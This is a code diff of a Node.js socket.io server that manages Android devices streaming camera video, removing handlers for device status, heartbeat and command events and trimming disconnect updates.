-        io.emit('device_update', {
-            id: device.id, name: device.name,
-            cameraReady: device.cameraReady || false,
-            streaming: device.streaming || false,
-            cameraPermission: device.cameraPermission || false,
-            batteryOptimization: device.batteryOptimization || false,
-            batteryPercentage: device.batteryPercentage || 0,
-            isConnected: true, hasWebSocket: true,
-            lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt,
-            galleryCount: (galleryData[device.id] || []).length
-        });
-    });
-
-    // Generic status event from Android devices.
-    socket.on('status', (data = {}) => {
-        const deviceId = socket.deviceId || data.deviceId;
-        if (!deviceId) {
-            console.log(`⚠️ WS status rejected — missing deviceId (${socket.id})`);
-            return socket.emit('status_ack', { success: false, error: 'Missing deviceId' });
-        }
-        const canonical = findCanonicalDevice(deviceId);
-        const canonicalId = canonical ? canonical.id : deviceId;
-        const device = devices.find(d => d.id === canonicalId);
-        if (!device) {
-            console.log(`⚠️ WS status rejected — unknown device ${canonicalId}`);
-            return socket.emit('status_ack', { success: false, error: 'Device not registered' });
-        }
-
-        const { cameraReady, streaming, cameraType, quality, fps,
-            batteryPercentage, batteryOptimization, charging, timestamp } = data;
-        if (cameraReady !== undefined) device.cameraReady = cameraReady;
-        if (streaming !== undefined) device.streaming = streaming;
-        if (cameraType !== undefined) device.cameraType = cameraType;
-        if (quality !== undefined) device.quality = quality;
-        if (fps !== undefined) device.fps = fps;
-        if (batteryPercentage !== undefined) device.batteryPercentage = batteryPercentage;
-        if (batteryOptimization !== undefined) device.batteryOptimization = batteryOptimization;
-        if (charging !== undefined) device.charging = charging;
-        if (timestamp !== undefined) device.timestamp = timestamp;
-        device.lastSeen = Date.now();
-        device.hasWebSocket = true;
-        socket.deviceId = canonicalId;
-        socket.join(`device_${canonicalId}`);
-        saveDevices();
-        console.log(`🔄 WS status: ${canonicalId}`, data);
-        socket.emit('status_ack', { success: true, deviceId: canonicalId });
-        io.emit('device_update', {
-            id: device.id, name: device.name,
-            cameraReady: device.cameraReady || false,
-            streaming: device.streaming || false,
-            cameraPermission: device.cameraPermission || false,
-            batteryOptimization: device.batteryOptimization || false,
-            batteryPercentage: device.batteryPercentage || 0,
-            isConnected: true, hasWebSocket: true,
-            lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt,
-            galleryCount: (galleryData[device.id] || []).length
-        });
-    });
-
-    // Generic heartbeat event from Android devices.
-    socket.on('heartbeat', (data = {}) => {
-        const deviceId = socket.deviceId || data.deviceId;
-        if (!deviceId) {
-            console.log(`⚠️ WS heartbeat rejected — missing deviceId (${socket.id})`);
-            return socket.emit('heartbeat_ack', { success: false, error: 'Missing deviceId' });
-        }
-        const canonical = findCanonicalDevice(deviceId);
-        const canonicalId = canonical ? canonical.id : deviceId;
-        let device = devices.find(d => d.id === canonicalId);
-        if (!device) {
-            device = {
-                id: canonicalId,
-                name: data.deviceName || 'Android Device',
-                connectedAt: new Date().toLocaleTimeString(),
-                firstSeen: Date.now()
-            };
-            devices.push(device);
-        }
-        if (data.deviceName) device.name = data.deviceName;
-        if (data.cameraReady !== undefined) device.cameraReady = data.cameraReady;
-        if (data.streaming !== undefined) device.streaming = data.streaming;
-        if (data.batteryPercentage !== undefined) device.batteryPercentage = data.batteryPercentage;
-        if (data.batteryOptimization !== undefined) device.batteryOptimization = data.batteryOptimization;
-        if (data.charging !== undefined) device.charging = data.charging;
-        if (data.timestamp !== undefined) device.timestamp = data.timestamp;
-        device.lastHeartbeat = new Date().toLocaleTimeString();
-        device.lastSeen = Date.now();
-        device.hasWebSocket = true;
-        socket.deviceId = canonicalId;
-        socket.join(`device_${canonicalId}`);
-        deviceHeartbeats[canonicalId] = Date.now();
-        saveDevices();
-        console.log(`💓 WS heartbeat: ${canonicalId}`, data);
-        socket.emit('heartbeat_ack', { success: true, deviceId: canonicalId });
-    });
-
-    // Device-originated command/event. Keep it in the existing command queue
-    // so the dashboard and HTTP polling path can observe it.
-    socket.on('command', (data = {}) => {
-        const deviceId = socket.deviceId || data.deviceId;
-        const command = data.command;
-        if (!deviceId || !command) {
-            console.log(`⚠️ WS command rejected — missing deviceId/command (${socket.id})`);
-            return socket.emit('command_ack', { success: false, error: 'Missing deviceId or command' });
-        }
-        const cmd = { command, value: data.value ?? null };
-        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-        pendingCommands[deviceId].push(cmd);
-        const device = devices.find(d => d.id === deviceId);
-        if (device) {
-            device.lastSeen = Date.now();
-            device.hasWebSocket = true;
-            saveDevices();
-        }
-        console.log(`📨 WS device command: ${command} for ${deviceId}`, data);
-        socket.emit('command_ack', { success: true, deviceId, command });
-        io.emit('device_update', { id: deviceId, isConnected: true, hasWebSocket: true });
     });
 
     socket.on('device_status_update', (data) => {
@@ -2286,35 +1829,14 @@ io.on('connection', (socket) => {
         if (deviceId) {
             if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
             pendingCommands[deviceId].push(cmd);
-            io.to(`device_${deviceId}`).emit('command', cmd);
         }
 
         console.log(`⚡ WS Command [${command}] queued for device [${deviceId}]`);
-        socket.emit('command_sent', {
-            success: true, deviceId, command, value: value ?? null
-        });
     });
 
     socket.on('disconnect', () => {
         if (socket.deviceId) {
             const disconnectedId = socket.deviceId;
-            const device = devices.find(d => d.id === disconnectedId);
-            if (device) {
-                device.hasWebSocket = false;
-                device.lastSeen = Date.now();
-                saveDevices();
-                io.emit('device_update', {
-                    id: device.id, name: device.name,
-                    cameraReady: device.cameraReady || false,
-                    streaming: device.streaming || false,
-                    cameraPermission: device.cameraPermission || false,
-                    batteryOptimization: device.batteryOptimization || false,
-                    batteryPercentage: device.batteryPercentage || 0,
-                    isConnected: false, hasWebSocket: false,
-                    lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt,
-                    galleryCount: (galleryData[device.id] || []).length
-                });
-            }
             setTimeout(() => {
                 if (activeStreams[disconnectedId] === socket.id) {
                     delete activeStreams[disconnectedId];
